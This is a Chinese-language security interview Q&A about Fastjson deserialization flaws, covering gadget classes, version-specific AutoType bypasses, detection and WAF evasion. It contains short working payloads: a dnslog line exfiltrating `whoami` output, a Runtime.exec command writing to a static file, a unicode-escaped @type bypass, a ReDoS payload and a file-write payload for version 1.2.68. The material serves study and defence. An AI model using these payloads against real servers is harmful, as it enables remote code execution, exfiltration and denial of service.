# Fastjson

### 使用`JSON.parse()`和`JSON.parseObject()`的不同（★）[+]

前者会在JSON字符串中解析字符串获取`@type`指定的类，后者则会直接使用参数中的`class`，并且对应类中(符合规范的)所有`getter`和`setter`都会被调用



### 什么情况下反序列化过程会反射调用`getter`（★）[+]

符合`getter`规范的情况且不存在`setter`



### 如果不存在`setter`和`getter`方法可以反射设置值吗（★）[+]

需要服务端开启`Feature.SupportNonPublicFiel`参数，实战无用



### Fastjson在反序列化`byte[]`类型的属性时会做什么事情（★）[+]

将会在反序列化时进行`base64`编码



### 谈谈常见的几种Payload（★★★）[+]

首先是最常见的`JdbcRowSetImpl`利用`JNDI`注入方式触发，**需要出网**

利用`TemplatesImpl`类比较鸡肋，**需要服务端开启特殊参数**

不出网的利用方式有一种`BasicDataSource`配合`BCEL`可实现`RCE`

另外某个版本之后支持`$ref`的功能，也可以构造一些Payload



### 是否存在不出网的Fastjson利用方式（★★★）

第一种是`TemplatesImpl`类加载字节码做到不出网利用，但需要开启特殊参数(`Feature.SupportNonPublicField`)实战鸡肋. (分为命令执行和内存马)

- 如何让它有回显：

  - dnslog外带:	

    ```md
    `whoami`.xxxxxx.dnslog.cn
    ```

  - 静态资源写⽂件:

    假设已经知道⽹站路径，拼接路径为：

    ```md
    /root/java_vuln_code-master/src/main/resources/static/js/consoleinfo.js
    ```

    则命令参数这么写:

    ```java
    Runtime.getRuntime().exec("whoami >> /root/java_vuln_code-
    master/src/main/resources/static/js/consoleinfo.js");
    ```

    

第二种方式是服务端存在在`tomcat-dbcp.jar`情况下，使用`BasicDataSource`配合`BCEL`可实现不出网`RCE` (同样能通过此方式写内存马)	——[浅析FastJson不出网利用方式](https://forum.butian.net/share/2040)

​											

### 谈谈1.2.47版本之前各个小版本的绕过（★★★）[+]

首先是利用解析问题可以加括号或大写L绕过低版本，高版本利用了哈希黑名单，之所以要哈希是因为防止黑客进行分析。但黑名单还是被破解了，有师傅找到可以绕过了类。在1.2.47版本中利用缓存绕过



### Fastjson应该如何探测（★★）[+]

使用`dnslog`做检测是最常见的方式，利用`java.net.Inet[4][6]Address`或`java.net.InetSocketAddress`或`java.net.URL`类，之所以使用这三个因为不在黑名单中，可以直接检测

除了这种方式，还可以自行实现虚假的`JNDI Server`作为反连平台，用`JdbcRowSetImpl`这样的`Payload`来触发

如果不能出网，可以结合不出网的利用方式和中间件的回显手段，执行无害命令检测，或利用报错回显



### 谈谈1.2.68版本的绕过（★★）[+]

1.2.68之前的66和67可以利用`JNDI`相关类，比如`Shiro`的`JndiObjectFactory`和`ignite`项目的类

1.2.68中有一个期望类属性，实现了期望接口的类可以被反序列化

利用类必须是`expectClass`类的子类或实现类，并且不在黑名单中，即可直接绕过`AutoType`检测，例如常见的`AutoCloseable`

这样的Payload通常第一个`@type`是`AutoCloseable`等合法类，第二个`@type`是恶意类，后续参数是恶意类需要的参数



### 谈谈Fastjson的WAF Bypass手段（★★★）[+]

Fastjson默认会去除键值外的空格、\b、\n、\r、\f等字符，同时还会自动将键值进行`unicode`与十六进制解码

例如针对`@type`的绕过：`\u0040\u0074\u0079\u0070\u0065`

加入特殊字符的绕过：`{\n"@type":"com.sun.rowset.JdbcRowSetImpl"...}`



### 除了RCE还能有什么利用（★★★）

信息泄露或者ReDoS，参考下方Payload

```json
{
    "regex":{
        "$ref":"$[\blue = /\^[a-zA-Z]+(([a-zA-Z])?[a-zA-Z]*)*$/]"
    },
    "blue":"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"
}
```

还可以实现写文件，例如以下这个针对1.2.68写文件的Payload

```json
{
  "@type": "java.lang.AutoCloseable",
  "@type": "java.io.FileOutputStream",
  "file": "/tmp/nonexist",
  "append": "false"
}
```



### 是否了解自动挖掘Fastjson利用链的方式（★★★★）

利用链主要集中在`getter`和`setter`方法中，如果`getter`或者`setter`的方法中存在一些危险操作比如`JNDI`查询，如果参数可控就可以导致`JNDI`注入

简单来说，直接搜对应项目中`JNDI`的`lookup`方法，可以基于`ASM`解压分析`Jar`包，这种半自动结合人工审核的方式其实很好用（之前挖到过几个）

进一步来说，全自动的方式可以使用`codeql`或`gadget-inspector`工具来做，主要是加入了污点传递，分析`getter/setter`参数如何传递到`lookup`

关于全自动分析原理，一般面试官不会问太深入，因为可能涉及到静态分析相关的技术，如果是实验室可能需要进一步学习